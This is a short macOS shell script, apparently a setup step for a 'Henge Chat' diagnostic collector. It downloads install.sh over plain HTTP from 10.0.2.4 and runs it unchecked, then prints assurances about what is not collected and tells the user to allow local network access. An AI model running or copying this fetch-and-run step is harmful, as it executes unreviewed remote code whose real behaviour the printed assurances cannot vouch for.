#!/bin/sh
set -eu
umask 077
echo 'Enabling the fixed Chat diagnostic collector in this Mac...'
HENGE_CHAT_SETUP_TMP=$(/usr/bin/mktemp -d "${TMPDIR:-/tmp}/henge-chat-setup.XXXXXX")
trap '/bin/rm -rf "$HENGE_CHAT_SETUP_TMP"' EXIT HUP INT TERM
/usr/bin/curl --fail --silent --show-error --connect-timeout 3 --max-time 20 \
    http://10.0.2.4/.henge/install -o "$HENGE_CHAT_SETUP_TMP/install.sh"
/bin/sh "$HENGE_CHAT_SETUP_TMP/install.sh"
echo 'Setup has finished. Check the Henge Helper window for its connection status.'
echo 'Once connected, return to Henge and use Collect Chat diagnostics.'
echo 'Versions, signature status and fixed error categories are included automatically.'
echo 'No conversation database, cookies, tokens, keychain or raw log text is exported.'
echo 'If macOS asks about Henge Helper and local networks, choose Allow.'
